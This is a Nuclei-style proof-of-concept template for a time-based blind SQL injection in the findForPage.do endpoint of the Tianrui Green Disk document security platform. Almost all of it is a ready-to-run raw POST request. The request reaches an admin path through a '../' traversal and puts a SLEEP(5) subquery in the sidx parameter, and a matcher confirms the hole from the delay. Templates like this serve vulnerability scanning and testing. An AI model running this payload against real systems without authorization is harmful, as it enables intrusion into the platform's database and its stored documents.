id: poc-wgd2gkg0c97qlgcb
info:
  name: 天锐绿盘文档安全管理平台 findForPage.do 存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - 'POST /lddsm/service/../admin/bfclConfig/findForPage.do HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21

    Accept-Encoding: gzip, deflate

    Accept: */*

    Content-Type: application/x-www-form-urlencoded


    page=1&rows=10&sidx=(SELECT * FROM (SELECT(SLEEP(5)))x)'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
